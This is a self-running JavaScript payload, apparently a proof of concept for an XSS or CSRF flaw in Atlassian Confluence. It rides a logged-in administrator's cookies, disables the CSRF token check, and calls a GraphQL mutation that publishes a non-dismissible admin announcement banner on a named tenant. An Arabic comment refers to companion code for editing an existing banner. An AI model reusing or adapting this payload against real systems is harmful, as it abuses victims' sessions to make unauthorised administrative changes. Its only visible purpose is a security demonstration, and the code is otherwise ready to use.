function createAnnouncement() {
  var xhttp = new XMLHttpRequest();
  var url = "https://anshall.atlassian.net/cgraphql?q=CreateFormCreateAdminAnnouncementBannerMutation";

  xhttp.open("POST", url, true);

  
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  xhttp.setRequestHeader("X-Apollo-Operation-Name", "CreateFormCreateAdminAnnouncementBannerMutation");
  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");

  xhttp.withCredentials = true;

 
  var data = JSON.stringify([{
    "operationName": "CreateFormCreateAdminAnnouncementBannerMutation",
    "variables": {
      "announcementBanner": {
        "appearance": "announcement",
        "isDismissible": false,
        "title": "IMPORTANT SECURITY UPDATE",
        "visibility": "AUTHORIZED",
        "content": "{\"version\":1,\"type\":\"doc\",\"content\":[{\"type\":\"paragraph\",\"content\":[{\"type\":\"text\",\"text\":\"This system has been verified for XSS vulnerability. Please contact the security team.\"}]}]}",
        "status": "PUBLISHED",
        "scheduledStartTime": "12/31/2025 17:15:41",
        "scheduledEndTime": null,
        "scheduledTimeZone": "Asia/Amman"
      }
    },
    "query": "mutation CreateFormCreateAdminAnnouncementBannerMutation($announcementBanner: ConfluenceCreateAdminAnnouncementBannerInput!) {\n  createAdminAnnouncementBanner(announcementBanner: $announcementBanner) {\n    adminAnnouncementBannerSetting {\n      appearance\n      content\n      id\n      isDismissible\n      status\n      title\n      visibility\n      __typename\n    }\n    errors {\n      message\n      extensions {\n        errorType\n        __typename\n      }\n      __typename\n    }\n    success\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Status: " + this.status);
      console.log("Response: " + this.responseText);
      if (this.responseText.includes('"success":true')) {
        console.log("✅ Announcement Created Successfully!");
      }
    }
  };

  xhttp.send(data);
}

createAnnouncement();
//ملاحطة مهمة مش لازم يكون في Announcement شغالة عشان ما يصير تضارب اذا كان في وحدة شغالة فينصح ب استخدام كود التعديل على الشغالة 
